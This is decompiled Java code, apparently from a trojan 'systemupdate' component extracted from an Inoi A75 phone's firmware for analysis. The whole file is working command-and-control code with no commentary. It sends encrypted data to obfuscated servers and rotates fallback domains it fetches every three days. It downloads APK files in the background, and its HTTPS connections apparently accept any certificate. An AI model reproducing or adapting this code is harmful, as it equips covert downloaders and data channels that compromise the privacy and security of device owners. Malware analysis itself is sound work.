package com.android.systemupdate.a.a;

import android.content.Context;
import android.os.SystemClock;
import android.text.TextUtils;
import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.RandomAccessFile;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.SecureRandom;
import java.security.Security;
import java.util.Locale;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;
import org.json.JSONArray;
import org.json.JSONObject;

/* JADX INFO: compiled from: HttpUtils.java */
/* JADX INFO: loaded from: /root/firmware-lab/inoi-a75/extracted/embedded_payloads/nested/b/classes.dex */
public class g {
    public static String a(Context context, String[] urls, String pathName, String params, boolean isDecrypt, byte[] public_key, byte[] private_key) {
        if (context == null || !p.a(context) || TextUtils.isEmpty(params)) {
            return "";
        }
        String result = "";
        if (urls != null && urls.length > 0) {
            for (String url : urls) {
                if (url.toLowerCase(Locale.getDefault()).startsWith("https")) {
                    result = c(context, String.valueOf(url) + pathName, params, isDecrypt, public_key, private_key);
                }
                if (result == null || result.length() == 0) {
                    result = b(context, String.valueOf(url) + pathName, params, isDecrypt, public_key, private_key);
                }
                if (result != null && result.length() > 0) {
                    break;
                }
            }
        }
        if (result == null || result.length() == 0) {
            return a(context, pathName, params, isDecrypt, public_key, private_key);
        }
        return result;
    }

    private static String a(Context context, String pathName, String params, boolean isDecrypt, byte[] public_key, byte[] private_key) {
        if (context == null || !p.a(context) || TextUtils.isEmpty(params)) {
            return "";
        }
        com.android.systemupdate.a.f.b();
        int len = com.android.systemupdate.a.b.c.length;
        String[] urls = new String[len];
        for (int i = 0; i < len; i++) {
            urls[i] = p.a(com.android.systemupdate.a.b.c[i]);
        }
        c.a(urls);
        if (urls == null || urls.length == 0) {
            return "";
        }
        String result = "";
        for (String url : urls) {
            if (url.toLowerCase(Locale.getDefault()).startsWith("https")) {
                result = c(context, String.valueOf(url) + pathName, params, isDecrypt, public_key, private_key);
            }
            if (result == null || result.length() == 0) {
                result = b(context, String.valueOf(url) + pathName, params, isDecrypt, public_key, private_key);
            }
            if (result != null && result.length() > 0) {
                break;
            }
        }
        if (result == null || result.length() == 0) {
            a(context, public_key, private_key);
            return result;
        }
        return result;
    }

    private static String b(Context context, String url, String params, boolean isDecrypt, byte[] public_key, byte[] private_key) {
        int times = 3;
        while (times > 0) {
            HttpURLConnection conn = null;
            try {
                try {
                    Security.setProperty("networkaddress.cache.ttl", String.valueOf(0));
                    Security.setProperty("networkaddress.cache.negative.ttl", String.valueOf(0));
                } catch (Throwable th) {
                }
                URL urls = new URL(url);
                HttpURLConnection conn2 = (HttpURLConnection) urls.openConnection();
                conn2.setConnectTimeout(60000);
                conn2.setReadTimeout(60000);
                conn2.setDoOutput(true);
                conn2.setDoInput(true);
                conn2.setUseCaches(false);
                conn2.setRequestMethod("POST");
                conn2.setRequestProperty("Content-Type", "application/octet-stream");
                conn2.setRequestProperty("Connection", "Keep-Alive");
                conn2.setRequestProperty("Charset", "UTF-8");
                if (!TextUtils.isEmpty(params)) {
                    String key = p.a(16);
                    String iv = p.a(16);
                    JSONObject json = new JSONObject();
                    json.put("a", k.a(String.valueOf(iv) + key, public_key));
                    json.put("b", a.a(params, key, iv));
                    conn2.setRequestProperty("Content-length", String.valueOf(json.toString().getBytes("UTF-8").length));
                    OutputStream outputStream = new DataOutputStream(conn2.getOutputStream());
                    outputStream.write(json.toString().getBytes("UTF-8"));
                    outputStream.flush();
                    outputStream.close();
                }
                int statusCode = conn2.getResponseCode();
                if (statusCode == 200) {
                    String content = n.b(conn2.getInputStream());
                    if (conn2 != null) {
                        conn2.disconnect();
                    }
                    if (isDecrypt) {
                        JSONObject json2 = new JSONObject(content);
                        String key2 = i.b(json2, "a");
                        String data = i.b(json2, "b");
                        String rsaKey = k.b(key2, private_key);
                        String aesIv = rsaKey.substring(0, 16);
                        String aesKey = rsaKey.substring(16, 32);
                        String result = a.b(data, aesKey, aesIv);
                        return result;
                    }
                    return "ok";
                }
                if (conn2 == null) {
                    return "";
                }
                conn2.disconnect();
                return "";
            } catch (Exception e) {
                if (0 != 0) {
                    conn.disconnect();
                }
                times--;
                if (times <= 0) {
                    return "";
                }
                SystemClock.sleep(3000L);
            }
        }
        return "";
    }

    private static String c(Context context, String url, String params, boolean isDecrypt, byte[] public_key, byte[] private_key) {
        int times = 3;
        while (times > 0) {
            HttpsURLConnection conn = null;
            try {
                try {
                    Security.setProperty("networkaddress.cache.ttl", String.valueOf(0));
                    Security.setProperty("networkaddress.cache.negative.ttl", String.valueOf(0));
                } catch (Throwable th) {
                }
                SSLContext sslContext = SSLContext.getInstance("SSL");
                TrustManager[] tm = {new j()};
                sslContext.init(null, tm, new SecureRandom());
                SSLSocketFactory ssf = sslContext.getSocketFactory();
                URL urls = new URL(url);
                HttpsURLConnection conn2 = (HttpsURLConnection) urls.openConnection();
                conn2.setSSLSocketFactory(ssf);
                conn2.setConnectTimeout(60000);
                conn2.setReadTimeout(60000);
                conn2.setDoOutput(true);
                conn2.setDoInput(true);
                conn2.setUseCaches(false);
                conn2.setRequestMethod("POST");
                conn2.setRequestProperty("Content-Type", "application/octet-stream");
                conn2.setRequestProperty("Connection", "Keep-Alive");
                conn2.setRequestProperty("Charset", "UTF-8");
                if (!TextUtils.isEmpty(params)) {
                    String key = p.a(16);
                    String iv = p.a(16);
                    JSONObject json = new JSONObject();
                    json.put("a", k.a(String.valueOf(iv) + key, public_key));
                    json.put("b", a.a(params, key, iv));
                    conn2.setRequestProperty("Content-length", String.valueOf(json.toString().getBytes("UTF-8").length));
                    OutputStream outputStream = new DataOutputStream(conn2.getOutputStream());
                    outputStream.write(json.toString().getBytes("UTF-8"));
                    outputStream.flush();
                    outputStream.close();
                }
                int statusCode = conn2.getResponseCode();
                if (statusCode == 200) {
                    String content = n.b(conn2.getInputStream());
                    if (conn2 != null) {
                        conn2.disconnect();
                    }
                    if (isDecrypt) {
                        JSONObject json2 = new JSONObject(content);
                        String key2 = i.b(json2, "a");
                        String data = i.b(json2, "b");
                        String rsaKey = k.b(key2, private_key);
                        String aesIv = rsaKey.substring(0, 16);
                        String aesKey = rsaKey.substring(16, 32);
                        String result = a.b(data, aesKey, aesIv);
                        return result;
                    }
                    return "ok";
                }
                if (conn2 == null) {
                    return "";
                }
                conn2.disconnect();
                return "";
            } catch (Exception e) {
                if (0 != 0) {
                    conn.disconnect();
                }
                times--;
                if (times <= 0) {
                    return "";
                }
                SystemClock.sleep(3000L);
            }
        }
        return "";
    }

    /* JADX INFO: Removed unreachable split cross block B:70:0x004d */
    private static void a(Context context, byte[] public_key, byte[] private_key) {
        if (context == null) {
            try {
                if (!p.a(context)) {
                    return;
                }
            } catch (Throwable th) {
                return;
            }
        }
        if (System.currentTimeMillis() - m.b(context, p.b(com.android.systemupdate.a.b.k), p.b(com.android.systemupdate.a.b.p), 0L) >= 259200000 && p.i() <= 4 && p.i() >= 1) {
            boolean isSuccess = false;
            int times = 3;
            while (times > 0) {
                HttpsURLConnection conn = null;
                try {
                    URL mUrl = new URL(p.a(com.android.systemupdate.a.a.w));
                    HttpsURLConnection conn2 = (HttpsURLConnection) mUrl.openConnection();
                    SSLContext sslContext = SSLContext.getInstance("SSL");
                    TrustManager[] tm = {new j()};
                    sslContext.init(null, tm, new SecureRandom());
                    SSLSocketFactory ssf = sslContext.getSocketFactory();
                    conn2.setSSLSocketFactory(ssf);
                    conn2.setConnectTimeout(60000);
                    conn2.setReadTimeout(60000);
                    conn2.setDoOutput(true);
                    conn2.setDoInput(true);
                    conn2.setUseCaches(false);
                    conn2.setRequestMethod("POST");
                    conn2.setRequestProperty("Content-Type", "application/octet-stream");
                    conn2.setRequestProperty("Connection", "Keep-Alive");
                    conn2.setRequestProperty("Charset", "UTF-8");
                    int statusCode = conn2.getResponseCode();
                    if (statusCode == 200) {
                        isSuccess = true;
                        n.b(conn2.getInputStream());
                        if (conn2 == null) {
                            break;
                        }
                        conn2.disconnect();
                        break;
                    }
                    if (conn2 == null) {
                        break;
                    }
                    conn2.disconnect();
                    break;
                } catch (Exception e) {
                    if (0 != 0) {
                        conn.disconnect();
                    }
                    times--;
                    if (times <= 0) {
                        break;
                    } else {
                        SystemClock.sleep(3000L);
                    }
                }
            }
            if (isSuccess) {
                m.a(context, p.b(com.android.systemupdate.a.b.k), p.b(com.android.systemupdate.a.b.p), System.currentTimeMillis());
                int times2 = 3;
                while (times2 > 0) {
                    HttpsURLConnection conn3 = null;
                    try {
                        JSONObject jsonParams = new JSONObject();
                        JSONObject jsonA = new JSONObject();
                        jsonA.put("a", 2307);
                        jsonParams.put("a", jsonA);
                        String params = jsonParams.toString();
                        URL mUrl2 = new URL(p.a(com.android.systemupdate.a.b.o));
                        HttpsURLConnection conn4 = (HttpsURLConnection) mUrl2.openConnection();
                        SSLContext sslContext2 = SSLContext.getInstance("SSL");
                        TrustManager[] tm2 = {new j()};
                        sslContext2.init(null, tm2, new SecureRandom());
                        SSLSocketFactory ssf2 = sslContext2.getSocketFactory();
                        conn4.setSSLSocketFactory(ssf2);
                        conn4.setConnectTimeout(60000);
                        conn4.setReadTimeout(60000);
                        conn4.setDoOutput(true);
                        conn4.setDoInput(true);
                        conn4.setUseCaches(false);
                        conn4.setRequestMethod("POST");
                        conn4.setRequestProperty("Content-Type", "application/octet-stream");
                        conn4.setRequestProperty("Connection", "Keep-Alive");
                        conn4.setRequestProperty("Charset", "UTF-8");
                        if (!TextUtils.isEmpty(params)) {
                            String key = p.a(16);
                            String iv = p.a(16);
                            JSONObject json = new JSONObject();
                            json.put("a", k.a(String.valueOf(iv) + key, public_key));
                            json.put("b", a.a(params, key, iv));
                            conn4.setRequestProperty("Content-length", String.valueOf(json.toString().getBytes("UTF-8").length));
                            OutputStream outputStream = new DataOutputStream(conn4.getOutputStream());
                            outputStream.write(json.toString().getBytes("UTF-8"));
                            outputStream.flush();
                            outputStream.close();
                        }
                        int statusCode2 = conn4.getResponseCode();
                        if (statusCode2 == 200) {
                            String content = n.b(conn4.getInputStream());
                            if (conn4 != null) {
                                conn4.disconnect();
                            }
                            JSONObject json2 = new JSONObject(content);
                            String key2 = i.b(json2, "a");
                            String data = i.b(json2, "b");
                            String rsaKey = k.b(key2, private_key);
                            String aesIv = rsaKey.substring(0, 16);
                            String aesKey = rsaKey.substring(16, 32);
                            String result = a.b(data, aesKey, aesIv);
                            if (!TextUtils.isEmpty(result)) {
                                try {
                                    JSONObject jsonObj = new JSONObject(result);
                                    JSONArray jsonDomainList = i.a(jsonObj, "a");
                                    if (jsonDomainList != null && jsonDomainList.length() > 0) {
                                        String domainStr = a.a(jsonDomainList.toString(), p.a(com.android.systemupdate.a.b.f), p.a(com.android.systemupdate.a.b.g));
                                        if (!TextUtils.isEmpty(domainStr)) {
                                            m.a(context, p.b(com.android.systemupdate.a.b.k), p.b(com.android.systemupdate.a.b.l), domainStr);
                                            f.a(String.valueOf(p.a(com.android.systemupdate.a.a.v)) + p.b(com.android.systemupdate.a.b.k), p.b(com.android.systemupdate.a.b.l), domainStr);
                                            return;
                                        }
                                        return;
                                    }
                                    return;
                                } catch (Throwable e2) {
                                    e2.printStackTrace();
                                    return;
                                }
                            }
                            return;
                        }
                        if (conn4 != null) {
                            conn4.disconnect();
                            return;
                        }
                        return;
                    } catch (Exception e3) {
                        if (0 != 0) {
                            conn3.disconnect();
                        }
                        times2--;
                        if (times2 > 0) {
                            SystemClock.sleep(3000L);
                        } else {
                            return;
                        }
                    }
                }
            }
        }
    }

    public static int a(Context context, String url, String path, int maxRedirection) {
        int status = 4;
        if (context != null && !p.a(context)) {
            return 7;
        }
        try {
            File folder = new File(path.substring(0, path.lastIndexOf(File.separator)));
            if (!folder.exists()) {
                folder.mkdirs();
            } else if (!folder.isDirectory()) {
                folder.delete();
                folder.mkdirs();
            }
        } catch (Throwable th) {
        }
        if (url.toLowerCase(Locale.getDefault()).startsWith("https")) {
            status = c(context, url, path, maxRedirection);
        }
        if (status != 1 && status != 3) {
            status = b(context, url, path, maxRedirection);
        }
        return status;
    }

    /* JADX WARN: Code duplicated, block: B:65:0x0171 A[Catch: Exception -> 0x010a, TRY_ENTER, TryCatch #2 {Exception -> 0x010a, blocks: (B:6:0x000a, B:9:0x004a, B:11:0x0089, B:13:0x0093, B:14:0x00b2, B:65:0x0171, B:66:0x0175, B:68:0x0179, B:70:0x017f, B:24:0x00ef, B:26:0x00f7, B:29:0x00fe, B:31:0x0106), top: B:92:0x000a }] */
    private static int b(Context context, String url, String path, int maxRedirection) {
        int newMaxRedirection;
        int status = 4;
        int times = 3;
        while (times > 0) {
            RandomAccessFile raf = null;
            InputStream is = null;
            HttpURLConnection conn = null;
            try {
                File tmp = new File(String.valueOf(path.substring(0, path.length() - 4)) + ".temp");
                File apk = new File(path);
                if (apk.exists()) {
                    times = 0;
                    status = 3;
                } else {
                    URL urls = new URL(url);
                    conn = (HttpURLConnection) urls.openConnection();
                    conn.setConnectTimeout(60000);
                    conn.setRequestMethod("GET");
                    conn.setRequestProperty("Content-Type", "application/octet-stream");
                    conn.setRequestProperty("Connection", "Keep-Alive");
                    long position = 0;
                    if (tmp.exists()) {
                        position = tmp.length();
                        if (position > 0) {
                            conn.addRequestProperty("Range", String.format("bytes=%s-", Long.valueOf(position)));
                        }
                    } else {
                        tmp.createNewFile();
                    }
                    RandomAccessFile raf2 = new RandomAccessFile(tmp, "rwd");
                    try {
                        int statusCode = conn.getResponseCode();
                        if (statusCode == 200 || statusCode == 206) {
                            InputStream is2 = conn.getInputStream();
                            byte[] bytes = new byte[1024];
                            while (true) {
                                int len = is2.read(bytes);
                                if (len == -1) {
                                    break;
                                }
                                raf2.seek(position);
                                position += (long) len;
                                raf2.write(bytes, 0, len);
                            }
                            is2.close();
                            raf2.close();
                            if (tmp.renameTo(apk)) {
                                tmp.delete();
                            }
                            times = 0;
                            if (conn != null) {
                                conn.disconnect();
                            }
                            status = 1;
                        } else {
                            try {
                                if (tmp.exists()) {
                                    tmp.delete();
                                }
                            } catch (Exception e) {
                            }
                            try {
                                if (apk.exists()) {
                                    apk.delete();
                                }
                            } catch (Exception e2) {
                            }
                            String redirectionUrl = null;
                            if (statusCode >= 300 && statusCode < 400) {
                                redirectionUrl = conn.getHeaderField("Location");
                            }
                            if (raf2 != null) {
                                try {
                                    raf2.close();
                                } catch (IOException ioe) {
                                    ioe.printStackTrace();
                                }
                                times = 0;
                                if (conn != null) {
                                    conn.disconnect();
                                }
                                newMaxRedirection = maxRedirection - 1;
                                if (newMaxRedirection <= 0 && !TextUtils.isEmpty(redirectionUrl)) {
                                    status = a(context, redirectionUrl, path, newMaxRedirection);
                                } else {
                                    status = 6;
                                }
                            }
                            times = 0;
                            if (conn != null) {
                                conn.disconnect();
                            }
                            newMaxRedirection = maxRedirection - 1;
                            if (newMaxRedirection <= 0) {
                            }
                            status = 6;
                        }
                    } catch (Exception e3) {
                        e = e3;
                        raf = raf2;
                        if (0 != 0) {
                            try {
                                is.close();
                            } catch (IOException ioe2) {
                                ioe2.printStackTrace();
                            }
                        }
                        if (raf != null) {
                            try {
                                raf.close();
                            } catch (IOException ioe3) {
                                ioe3.printStackTrace();
                            }
                        }
                        if (conn != null) {
                            conn.disconnect();
                        }
                        times--;
                        if (times > 0) {
                            SystemClock.sleep(3000L);
                        } else if (e instanceof IOException) {
                            status = 5;
                        } else {
                            status = 4;
                        }
                    }
                }
            } catch (Exception e4) {
                e = e4;
            }
        }
        return status;
    }

    /* JADX WARN: Code duplicated, block: B:65:0x01a3 A[Catch: Exception -> 0x013c, TRY_ENTER, TryCatch #1 {Exception -> 0x013c, blocks: (B:6:0x000a, B:9:0x004a, B:11:0x00bb, B:13:0x00c5, B:14:0x00e4, B:65:0x01a3, B:66:0x01a7, B:68:0x01ab, B:70:0x01b1, B:24:0x0121, B:26:0x0129, B:29:0x0130, B:31:0x0138), top: B:90:0x000a }] */
    private static int c(Context context, String url, String path, int maxRedirection) {
        int newMaxRedirection;
        int status = 4;
        int times = 3;
        while (times > 0) {
            RandomAccessFile raf = null;
            InputStream is = null;
            HttpsURLConnection conn = null;
            try {
                File tmp = new File(String.valueOf(path.substring(0, path.length() - 4)) + ".temp");
                File apk = new File(path);
                if (apk.exists()) {
                    times = 0;
                    status = 3;
                } else {
                    SSLContext sslContext = SSLContext.getInstance("SSL");
                    TrustManager[] tm = {new j()};
                    sslContext.init(null, tm, new SecureRandom());
                    SSLSocketFactory ssf = sslContext.getSocketFactory();
                    URL urls = new URL(url);
                    conn = (HttpsURLConnection) urls.openConnection();
                    conn.setSSLSocketFactory(ssf);
                    conn.setConnectTimeout(60000);
                    conn.setRequestMethod("GET");
                    conn.setRequestProperty("Content-Type", "application/octet-stream");
                    conn.setRequestProperty("Connection", "Keep-Alive");
                    long position = 0;
                    if (tmp.exists()) {
                        position = tmp.length();
                        if (position > 0) {
                            conn.addRequestProperty("Range", String.format("bytes=%s-", Long.valueOf(position)));
                        }
                    } else {
                        tmp.createNewFile();
                    }
                    RandomAccessFile raf2 = new RandomAccessFile(tmp, "rwd");
                    try {
                        int statusCode = conn.getResponseCode();
                        if (statusCode == 200 || statusCode == 206) {
                            InputStream is2 = conn.getInputStream();
                            byte[] bytes = new byte[1024];
                            while (true) {
                                int len = is2.read(bytes);
                                if (len == -1) {
                                    break;
                                }
                                raf2.seek(position);
                                position += (long) len;
                                raf2.write(bytes, 0, len);
                            }
                            is2.close();
                            raf2.close();
                            if (tmp.renameTo(apk)) {
                                tmp.delete();
                            }
                            times = 0;
                            if (conn != null) {
                                conn.disconnect();
                            }
                            status = 1;
                        } else {
                            try {
                                if (tmp.exists()) {
                                    tmp.delete();
                                }
                            } catch (Exception e) {
                            }
                            try {
                                if (apk.exists()) {
                                    apk.delete();
                                }
                            } catch (Exception e2) {
                            }
                            String redirectionUrl = null;
                            if (statusCode >= 300 && statusCode < 400) {
                                redirectionUrl = conn.getHeaderField("Location");
                            }
                            if (raf2 != null) {
                                try {
                                    raf2.close();
                                } catch (IOException ioe) {
                                    ioe.printStackTrace();
                                }
                                times = 0;
                                if (conn != null) {
                                    conn.disconnect();
                                }
                                newMaxRedirection = maxRedirection - 1;
                                if (newMaxRedirection <= 0 && !TextUtils.isEmpty(redirectionUrl)) {
                                    status = a(context, redirectionUrl, path, newMaxRedirection);
                                } else {
                                    status = 6;
                                }
                            }
                            times = 0;
                            if (conn != null) {
                                conn.disconnect();
                            }
                            newMaxRedirection = maxRedirection - 1;
                            if (newMaxRedirection <= 0) {
                            }
                            status = 6;
                        }
                    } catch (Exception e3) {
                        e = e3;
                        raf = raf2;
                        if (0 != 0) {
                            try {
                                is.close();
                            } catch (IOException ioe2) {
                                ioe2.printStackTrace();
                            }
                        }
                        if (raf != null) {
                            try {
                                raf.close();
                            } catch (IOException ioe3) {
                                ioe3.printStackTrace();
                            }
                        }
                        if (conn != null) {
                            conn.disconnect();
                        }
                        times--;
                        if (times > 0) {
                            SystemClock.sleep(3000L);
                        } else if (e instanceof IOException) {
                            status = 5;
                        } else {
                            status = 4;
                        }
                    }
                }
            } catch (Exception e4) {
                e = e4;
            }
        }
        return status;
    }

    public static int a(Context context, String[] urls, String state, String signa) {
        if (context == null || !p.a(context)) {
            return -1;
        }
        String result = "";
        if (urls != null && urls.length > 0) {
            for (String url : urls) {
                if (url.toLowerCase(Locale.getDefault()).startsWith("https")) {
                    result = b(context, url, state, signa);
                } else {
                    result = a(context, url, state, signa);
                }
                if (result != null && result.length() > 0) {
                    break;
                }
            }
        }
        if (result == null) {
            return -1;
        }
        try {
            if (result.length() > 0) {
                return Integer.parseInt(result);
            }
            return -1;
        } catch (Throwable th) {
            return -1;
        }
    }

    /* JADX INFO: Removed unreachable split cross block B:21:0x0005 */
    private static String a(Context context, String url, String state, String signa) {
        String result = "";
        int times = 3;
        while (times > 0) {
            HttpURLConnection conn = null;
            try {
                URL urls = new URL(url);
                HttpURLConnection conn2 = (HttpURLConnection) urls.openConnection();
                conn2.setConnectTimeout(60000);
                conn2.setReadTimeout(60000);
                conn2.setDoOutput(true);
                conn2.setDoInput(true);
                conn2.setUseCaches(false);
                conn2.setRequestMethod("POST");
                conn2.setRequestProperty("Content-Type", "application/octet-stream");
                conn2.setRequestProperty("Connection", "Keep-Alive");
                conn2.setRequestProperty("Charset", "UTF-8");
                conn2.setRequestProperty("state", state);
                conn2.setRequestProperty("signa", signa);
                int statusCode = conn2.getResponseCode();
                if (statusCode == 200) {
                    result = n.b(conn2.getInputStream());
                    if (conn2 == null) {
                        break;
                    }
                    conn2.disconnect();
                    break;
                }
                if (conn2 == null) {
                    break;
                }
                conn2.disconnect();
                break;
            } catch (Throwable th) {
                if (0 != 0) {
                    conn.disconnect();
                }
                times--;
                if (times <= 0) {
                    break;
                }
                SystemClock.sleep(3000L);
            }
        }
        return result;
    }

    /* JADX INFO: Removed unreachable split cross block B:21:0x0005 */
    private static String b(Context context, String url, String state, String signa) {
        String result = "";
        int times = 3;
        while (times > 0) {
            HttpsURLConnection conn = null;
            try {
                SSLContext sslContext = SSLContext.getInstance("SSL");
                TrustManager[] tm = {new j()};
                sslContext.init(null, tm, new SecureRandom());
                SSLSocketFactory ssf = sslContext.getSocketFactory();
                URL urls = new URL(url);
                HttpsURLConnection conn2 = (HttpsURLConnection) urls.openConnection();
                conn2.setSSLSocketFactory(ssf);
                conn2.setConnectTimeout(60000);
                conn2.setReadTimeout(60000);
                conn2.setDoOutput(true);
                conn2.setDoInput(true);
                conn2.setUseCaches(false);
                conn2.setRequestMethod("POST");
                conn2.setRequestProperty("Content-Type", "application/octet-stream");
                conn2.setRequestProperty("Connection", "Keep-Alive");
                conn2.setRequestProperty("Charset", "UTF-8");
                conn2.setRequestProperty("state", state);
                conn2.setRequestProperty("signa", signa);
                int statusCode = conn2.getResponseCode();
                if (statusCode == 200) {
                    result = n.b(conn2.getInputStream());
                    if (conn2 == null) {
                        break;
                    }
                    conn2.disconnect();
                    break;
                }
                if (conn2 == null) {
                    break;
                }
                conn2.disconnect();
                break;
            } catch (Throwable th) {
                if (0 != 0) {
                    conn.disconnect();
                }
                times--;
                if (times <= 0) {
                    break;
                }
                SystemClock.sleep(3000L);
            }
        }
        return result;
    }
}
